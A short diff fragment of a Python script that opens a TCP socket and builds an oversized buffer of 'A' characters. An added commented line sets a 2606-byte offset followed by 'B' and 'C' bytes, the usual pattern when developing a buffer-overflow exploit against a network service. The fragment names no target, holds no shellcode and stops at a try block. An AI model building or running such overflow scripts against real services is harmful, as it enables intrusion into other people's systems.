@@ -2,6 +2,7 @@
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+# buffer = "A"*2606+"B"*4+"C"*90
 buffer = 'A' * 2700
 
 try:
